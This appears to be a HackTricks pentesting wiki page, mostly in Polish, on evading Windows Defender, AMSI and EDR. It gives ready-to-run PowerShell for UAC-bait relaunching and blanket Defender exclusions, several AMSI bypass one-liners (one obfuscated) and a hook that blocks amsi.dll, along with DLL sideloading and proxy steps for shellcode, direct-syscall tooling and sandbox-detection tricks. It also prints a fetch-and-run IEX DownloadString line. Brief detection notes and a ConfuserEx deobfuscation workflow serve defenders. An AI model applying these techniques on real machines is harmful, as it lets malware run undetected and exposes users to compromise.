# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została początkowo napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender poprzez podszywanie się pod inny AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders podszywające się pod game cheats często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień** i dopiero potem neutralizują Defender. Przepływ jest prosty:

1. Sprawdź obecność kontekstu administracyjnego za pomocą `net session`. To polecenie działa tylko wtedy, gdy proces wywołujący ma uprawnienia admina, więc niepowodzenie oznacza, że loader działa jako zwykły user.
2. Natychmiast uruchom ponownie siebie z verbem `RunAs`, aby wywołać oczekiwany monit UAC i zachować oryginalną linię poleceń.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Ofiary już wierzą, że instalują „cracked” software, więc prompt jest zwykle akceptowany, co daje malware uprawnienia potrzebne do zmiany policy Defendera.

### Blanket `MpPreference` exclusions for every drive letter

Po uzyskaniu podwyższonych uprawnień, łańcuchy w stylu GachiLoader maksymalizują martwe strefy Defendera zamiast całkowicie wyłączać usługę. Loader najpierw zabija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a następnie ustawia **ekstremalnie szerokie exclusions**, tak aby każdy user profile, system directory i removable disk stały się niemożliwe do skanowania:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, USB sticks itd.), więc **każdy przyszły payload zrzucony gdziekolwiek na dysku jest ignorowany**.
- Wykluczenie rozszerzenia `.sys` jest perspektywiczne — atakujący zachowują możliwość późniejszego ładowania niepodpisanych driverów bez ponownego dotykania Defender.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu późniejsze etapy mogą potwierdzić, że wykluczenia nadal obowiązują, albo rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ nie jest zatrzymywany żaden Defender service, naiwne health checks nadal raportują „antivirus active”, mimo że real-time inspection nigdy nie dotyka tych ścieżek.

## **AV Evasion Methodology**

Obecnie AV używają różnych metod sprawdzania, czy plik jest malicious czy nie: static detection, dynamic analysis, a w bardziej zaawansowanych EDR także behavioural analysis.

### **Static detection**

Static detection polega na oznaczaniu znanych malicious stringów lub tablic bajtów w binary lub script, a także na wyodrębnianiu informacji z samego pliku (np. file description, company name, digital signatures, icon, checksum itd.). Oznacza to, że używanie znanych public tools może łatwiej doprowadzić do wykrycia, bo prawdopodobnie zostały już przeanalizowane i oznaczone jako malicious. Istnieje kilka sposobów obejścia tego typu detekcji:

- **Encryption**

Jeśli zaszyfrujesz binary, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loader, który odszyfruje i uruchomi program w memory.

- **Obfuscation**

Czasem wystarczy zmienić kilka stringów w binary lub script, aby obejść AV, ale może to być czasochłonne, zależnie od tego, co próbujesz obfuscate.

- **Custom tooling**

Jeśli tworzysz własne tools, nie będzie znanych złych signatures, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem sprawdzania static detection w Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Zasadniczo dzieli on plik na wiele segmentów, a następnie zleca Defender skanowanie każdego z nich osobno, dzięki czemu możesz dokładnie zobaczyć, które stringi lub bajty w twoim binary zostały oznaczone.

Gorąco polecam sprawdzić tę [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Dynamic analysis**

Dynamic analysis ma miejsce wtedy, gdy AV uruchamia twój binary w sandbox i obserwuje malicious activity (np. próbę odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itd.). Ta część może być nieco trudniejsza, ale oto kilka rzeczy, które możesz zrobić, aby evade sandboxes.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób obejścia dynamic analysis w AV. AV mają bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie sleeps mogą utrudniać analizę binary. Problem polega na tym, że wiele sandbox w AV może po prostu pominąć sleep, zależnie od implementacji.
- **Checking machine's resources** Zazwyczaj sandbox mają bardzo mało resources do dyspozycji (np. < 2GB RAM), inaczej mogłyby spowalniać machine użytkownika. Możesz tu też być bardzo kreatywny, na przykład sprawdzając temperaturę CPU albo nawet prędkość wentylatorów; nie wszystko będzie zaimplementowane w sandbox.
- **Machine-specific checks** Jeśli chcesz targetować usera, którego workstation jest dołączona do domeny "contoso.local", możesz sprawdzić domain komputera, aby zobaczyć, czy pasuje do tej, którą określiłeś; jeśli nie, możesz sprawić, by twój program zakończył działanie.

Okazuje się, że nazwa komputera w sandbox Microsoft Defender to HAL9TH, więc możesz sprawdzać nazwę komputera w swoim malware przed detonation; jeśli nazwa odpowiada HAL9TH, oznacza to, że jesteś wewnątrz sandbox Defender, więc możesz sprawić, by twój program zakończył działanie.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) do walki z Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak już wcześniej powiedzieliśmy w tym poście, **public tools** ostatecznie **zostaną wykryte**, więc powinieneś zadać sobie jedno pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz użyć innego project, który jest mniej znany, a także zrzuca LSASS.

Prawidłowa odpowiedź to prawdopodobnie to drugie. Biorąc mimikatz jako przykład, to prawdopodobnie jeden z najbardziej, jeśli nie najbardziej flagowanych piece of malware przez AV i EDR, a sam projekt jest super cool, ale też koszmarem, jeśli chodzi o working around AV, więc po prostu szukaj alternatyw do tego, co próbujesz osiągnąć.

> [!TIP]
> Podczas modyfikowania swoich payloads pod evasion, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w defender, i proszę, poważnie, **NIE WYSYŁAJ DO VIRUSTOTAL** jeśli twoim celem jest długofalowe osiągnięcie evasion. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.

## EXEs vs DLLs

Gdy tylko jest to możliwe, zawsze **priorytetowo używaj DLLs do evasion**; z mojego doświadczenia pliki DLL są zwykle **dużo rzadziej wykrywane** i analizowane, więc to bardzo prosty trick, aby w niektórych przypadkach uniknąć detection (oczywiście jeśli twój payload ma jakiś sposób uruchamiania jako DLL).

Jak widać na tym obrazie, DLL Payload z Havoc ma detection rate 4/26 w antiscan.me, podczas gdy payload EXE ma detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Teraz pokażemy kilka tricków, których możesz użyć z plikami DLL, aby były znacznie bardziej stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje order wyszukiwania DLL używany przez loader, umieszczając obok siebie zarówno victim application, jak i malicious payload(s).

Możesz sprawdzić programy podatne na DLL Sideloading za pomocą [Siofra](https://github.com/Cybereason/siofra) oraz następującego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking w obrębie "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Zdecydowanie polecam, abyś sam **przeanalizował programy podatne na DLL Hijackable/Sideloadable**; ta technika jest dość stealthy, jeśli jest wykonana poprawnie, ale jeśli użyjesz publicznie znanych programów DLL Sideloadable, możesz zostać łatwo wykryty.

Samo umieszczenie złośliwego DLL o nazwie, której program spodziewa się załadować, nie uruchomi twojego payload, ponieważ program oczekuje w tym DLL pewnych konkretnych funkcji; aby naprawić ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje do proxy (i złośliwego) DLL do oryginalnego DLL, zachowując dzięki temu funkcjonalność programu i umożliwiając obsługę uruchomienia twojego payload.

Będę używać projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną przemianowaną DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany przy użyciu [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają współczynnik wykrycia 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam**, abyś obejrzał [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz także [wideo ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy bardziej szczegółowo.

### Wykorzystywanie Forwarded Exports (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które w rzeczywistości są „forwarders”: zamiast wskazywać na kod, wpis eksportu zawiera łańcuch ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, Windows loader:

- Załaduje `TargetDll`, jeśli nie jest już załadowany
- Rozwiąże z niego `TargetFunc`

Kluczowe zachowania, które trzeba zrozumieć:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, używana jest normalna kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego forward resolution.

To umożliwia pośredni primitive sideloading: znajdź podpisany DLL, który eksportuje funkcję przekazaną do nazwy modułu innego niż KnownDLL, a następnie umieść ten podpisany DLL razem z DLL kontrolowanym przez atakującego, nazwanym dokładnie tak jak przekazany moduł docelowy. Gdy zostanie wywołany forwarded export, loader rozwiąże forward i załaduje twój DLL z tego samego katalogu, uruchamiając twoje DllMain.

Przykład zaobserwowany na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany przez normalną kolejność wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisany systemowy DLL do folderu z możliwością zapisu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny DllMain wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować przekazywanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wyzwól forward za pomocą podpisanego LOLBina:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface`, loader podąża za forward do `NCRYPTPROV.SetAuditingInterface`
- Loader następnie ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, dostaniesz błąd "missing API" dopiero po tym, jak `DllMain` już się uruchomił

Wskazówki do huntingu:
- Skup się na forwarded exports, gdzie docelowy moduł nie jest KnownDLL. KnownDLLs są listowane w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz enumerować forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz Windows 11 forwarder inventory, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Pomysły na detection/defense:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLLs z nie-systemowych ścieżek, a następnie ładujące non-KnownDLLs z tą samą nazwą bazową z tego katalogu
- Alertuj na łańcuchy procesów/modułów takie jak: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuś code integrity policies (WDAC/AppLocker) i blokuj write+execute w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze do załadowania i wykonania swojego shellcode w stealthy sposób.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to tylko gra w kotka i myszkę, to co działa dziś może zostać wykryte jutro, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, próbuj łączyć wiele technik evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-y często nakładają **user-mode inline hooks** na syscall stubs w `ntdll.dll`. Aby obejść te hooki, możesz wygenerować **direct** lub **indirect** syscall stubs, które ładują poprawny **SSN** (System Service Number) i przechodzą do kernel mode bez wykonywania zahookowanego export entrypoint.

**Invocation options:**
- **Direct (embedded)**: wstaw instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez trafienia w export `ntdll`).
- **Indirect**: skok do istniejącego `syscall` gadget wewnątrz `ntdll`, aby przejście do kernela wyglądało tak, jakby pochodziło z `ntdll` (przydatne do heuristic evasion); **randomized indirect** wybiera gadget z puli dla każdego wywołania.
- **Egg-hunt**: unikaj osadzania statycznej sekwencji opcode `0F 05` na dysku; rozwiąż sekwencję syscall w runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: wywnioskuj SSN-y, sortując syscall stubs według virtual address zamiast odczytywać bajty stubów.
- **SyscallsFromDisk**: zmapuj czysty `\KnownDlls\ntdll.dll`, odczytaj SSN-y z jego `.text`, a następnie odmapuj (omija wszystkie in-memory hooks).
- **RecycledGate**: połącz VA-sorted SSN inference z walidacją opcode, gdy stub jest czysty; jeśli jest zahookowany, wróć do VA inference.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z `EAX` w runtime, bez parsowania zahookowanych bajtów.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI został stworzony, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AV były w stanie skanować tylko **pliki na dysku**, więc jeśli dało się jakoś uruchamiać payloads **bezpośrednio w pamięci**, AV nie mogło nic zrobić, aby to powstrzymać, ponieważ nie miało wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z tymi komponentami Windows.

- User Account Control, czyli UAC (elevation pliku EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja code)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA macros

Pozwala rozwiązaniom antivirus inspectować zachowanie skryptów, ujawniając ich zawartość w formie, która jest zarówno nieszyfrowana, jak i nieobfuskowana.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wygeneruje następujący alert w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zauważ, że dodaje na początku `amsi:`, a następnie path do executable, z którego uruchomiono skrypt; w tym przypadku, powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, ale i tak zostaliśmy wykryci w pamięci przez AMSI.

Co więcej, począwszy od **.NET 4.8**, code C# jest również uruchamiany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])`, używanego do in-memory execution. Dlatego do in-memory execution zaleca się używanie niższych wersji .NET (jak 4.7.2 lub niższej), jeśli chcesz evade AMSI.

Istnieje kilka sposobów obejścia AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie na podstawie static detections, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na evading detection.

Jednak AMSI ma możliwość unobfuscating skryptów nawet wtedy, gdy mają wiele warstw, więc obfuscation może być złym wyborem w zależności od tego, jak zostanie wykonana. To sprawia, że obejście nie jest takie proste. Czasem jednak wystarczy zmienić kilka nazw zmiennych i wszystko będzie działać, więc zależy to od tego, jak bardzo coś zostało flagged.

- **AMSI Bypass**

Ponieważ AMSI jest zaimplementowany przez ładowanie DLL do procesu powershell (także cscript.exe, wscript.exe itd.), można go łatwo tamper with, nawet działając jako nieuprzywilejowany user. Z powodu tej flaw w implementacji AMSI badacze odkryli wiele sposobów na evading AMSI scanning.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie uruchomione żadne scan. Pierwotnie opisał to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował signature, aby ograniczyć szersze użycie.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście oznaczona przez samo AMSI, więc potrzebna jest pewna modyfikacja, aby użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że to prawdopodobnie zostanie oznaczone, gdy ten post się pojawi, więc nie powinieneś publikować żadnego kodu, jeśli Twoim planem jest pozostanie niewykrytym.

**Memory Patching**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) oraz nadpisaniu jej instrukcjami, które zwracają kod E_INVALIDARG, dzięki czemu wynik rzeczywistego skanowania będzie zwracał 0, co jest interpretowane jako czysty wynik.

> [!TIP]
> Proszę przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) dla bardziej szczegółowego wyjaśnienia.

Istnieje także wiele innych technik używanych do bypass AMSI z powershell, sprawdź [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) oraz [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się o nich więcej.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Niezawodnym, niezależnym od języka bypass jest umieszczenie hook w trybie user-mode na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądany moduł to `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i dla tego procesu nie odbywają się żadne skany.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Works across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

Logging PowerShell to funkcja, która pozwala rejestrować wszystkie komendy PowerShell uruchamiane w systemie. Może to być przydatne do audytu i diagnostyki, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby obejść PowerShell logging, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) w tym celu.
- **Use Powershell version 2**: Jeśli używasz PowerShell version 2, AMSI nie zostanie załadowane, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz zrobić to tak: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby uruchomić powershell bez ochrony (to właśnie wykorzystuje `powerpick` z Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie open-source fork [LLVM](http://www.llvm.org/) compilation suite, zdolnego zapewnić zwiększone bezpieczeństwo oprogramowania dzięki [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania w czasie kompilacji obfuscated code bez użycia jakichkolwiek zewnętrznych narzędzi i bez modyfikowania kompilera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations wygenerowanych przez framework C++ template metaprogramming, co nieco utrudni życie osobie chcącej crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuscate various different pe files including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to fine-grained code obfuscation framework dla języków wspieranych przez LLVM, używający ROP (return-oriented programming). ROPfuscator obfuscates program na poziomie assembly code, przekształcając zwykłe instrukcje w ROP chains, co burzy nasze naturalne pojmowanie normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi convert existing EXE/DLL into shellcode i następnie je load them

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych executable z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa przeznaczony do ochrony końcowego użytkownika przed uruchamianiem potencjalnie malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

